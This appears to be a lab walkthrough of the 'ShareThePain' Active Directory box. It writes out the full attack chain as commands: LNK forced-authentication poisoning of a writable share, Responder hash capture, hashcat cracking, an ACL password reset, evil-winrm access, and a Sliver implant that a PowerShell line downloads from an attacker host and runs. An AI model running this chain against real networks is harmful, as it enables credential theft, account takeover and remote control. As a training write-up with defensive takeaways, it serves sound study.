---
title: "ShareThePain — Active Directory Walkthrough: Writable Share to Forced Auth to ACL Abuse"
description: "Active Directory walkthrough of ShareThePain (Windows Server 2022) — coercing DC authentication from a writable SMB share, cracking the hash, abusing an ACL reset, then pivoting toward an internal MSSQL service."
date: 2026-07-05 12:00:00 +0000
categories: [Active Directory]
tags: [active-directory, forced-authentication, responder, acl-abuse, pivoting, oscp]
difficulty: Hard
---

> **Box:** Active Directory (Hack Smarter / OSCP-style) · **OS:** Windows Server 2022 · **Domain:** hack.smarter · **Theme:** Writable share → forced-auth (LNK) → crack → ACL abuse → internal pivot

ShareThePain lives up to its name — the whole box pivots on a **writable SMB share** that the domain controller itself browses, which lets you coerce authentication and steal a hash without any starting credentials. From there it's the familiar Hack-Smarter AD rhythm: crack, map with BloodHound, abuse an ACL, and land the user flag — before the trail turns inward toward a local-only SQL service.

## Recon

```bash
rustscan -a 10.1.185.142 -- -A
```

A textbook domain-controller footprint — DNS, Kerberos, LDAP, SMB, WinRM, ADWS — with **SMB signing enabled** but **null authentication allowed**. The certs named the domain **hack.smarter** and host **DC01**. Into `/etc/hosts`.

## SMB Enumeration — the writable share

A null session was permitted, so I listed shares straight away:

```bash
nxc smb 10.1.185.142 -u '' -p '' --shares
```

Among the defaults sat a custom share simply called **`Share`** — with **READ,WRITE** for everyone. On a box named ShareThePain, that's not subtle.

## Forced Authentication — LNK poisoning

A writable share that privileged users (or the DC) browse is a classic **forced-authentication** setup. I planted a malicious shortcut on it with netexec's `slinky` module and stood up Responder to catch the callback:

```bash
nxc smb 10.1.185.142 -u 'guest' -p '' -M slinky -o SERVER=<attacker-ip> SHARES=Share NAME=systemd
# [+] Created LNK file on the Share share
```

```bash
sudo responder -I tun0 -v
```

Almost immediately, Responder logged repeated **NTLMv2** authentications from **HACK\bob.ross** — the share was being auto-rendered, and the shortcut's icon path forced the DC to authenticate to me.

## Cracking → bob.ross

I saved the captured NetNTLMv2 hash and cracked it with hashcat mode 5600:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
# BOB.ROSS : 137Password123!@#
```

## Foothold & Enumeration

The creds validated over SMB. I looted SYSVOL (GPO policies) and ran a full BloodHound collection to find a path forward:

```bash
nxc smb 10.1.185.142 -u 'BOB.ROSS' -p '137Password123!@#' --shares
smbclient //hack.smarter/SYSVOL -U "BOB.ROSS"
nxc ldap 10.1.185.142 -u 'BOB.ROSS' -p '137Password123!@#' --bloodhound --collection All --dns-server 10.1.185.142
```

## ACL Abuse → alice.wonderland

BloodHound revealed that **BOB.ROSS** could reset the password of **ALICE.WONDERLAND**. One `net rpc` command later, that account was mine:

```bash
net rpc password "ALICE.WONDERLAND" "cyber@123" -U "HACK.SMARTER"/"BOB.ROSS"%'137Password123!@#' -S 10.1.185.142
nxc smb 10.1.185.142 -u 'ALICE.WONDERLAND' -p 'cyber@123'   # [+] valid
```

## User Flag

alice.wonderland had WinRM access:

```bash
evil-winrm -i HACK.SMARTER -u 'ALICE.WONDERLAND' -p 'cyber@123'
*Evil-WinRM* PS C:\Users\alice.wonderland\Desktop> type user.txt
# bWFkZV9pdF90aGlzX2Zhcgo=   ->  base64 -d  ->  made_it_this_far
```

## Lateral Movement — toward the internal SQL service

Enumerating listeners from the alice.wonderland shell turned up something not exposed externally — **MSSQL bound to localhost**:

```powershell
netstat -ano | findstr LISTENING
# TCP  127.0.0.1:1433  ...  4260
Get-Process -Id 4260   # sqlservr
```

A local-only service means the next move is to **pivot** through this host to reach it. I set up a Sliver C2 implant for the tunnel and staged it over a quick HTTP server:

```bash
sliver > generate --mtls <attacker-ip>:443 --os windows --format exe pivot.exe
```

```powershell
wget http://<attacker-ip>:8000/pivot.exe -O pivot.exe ; ./pivot.exe
```

## Privilege Escalation — root

*(This run's notes stop at the pivot implant.)* With a foothold session established, the next step is to tunnel into `127.0.0.1:1433` and attack the local MSSQL instance — authenticating and abusing its service context to escalate toward Administrator/root. I'll complete this section once I've captured the MSSQL path.

## Takeaways

- **Writable shares are forced-auth traps.** No creds needed — write access plus a browsing victim (here, the DC itself) equals a stolen NTLMv2 hash.
- **Signing on, but it didn't matter.** SMB signing blocks relaying, but it does nothing to stop *capturing* and cracking a weak password offline.
- **BloodHound turns a low-priv user into a path.** The bob.ross → alice.wonderland reset right is invisible by hand and obvious in the graph.
- **Localhost services are the next frontier.** An internally-bound MSSQL instance is only reachable after a foothold — pivoting is the escalation.
- **Defensive fixes:** remove write access from shares users don't need it on, disable LLMNR/NBT-NS to kill Responder, enforce strong passwords, and tighten dangerous reset ACLs.
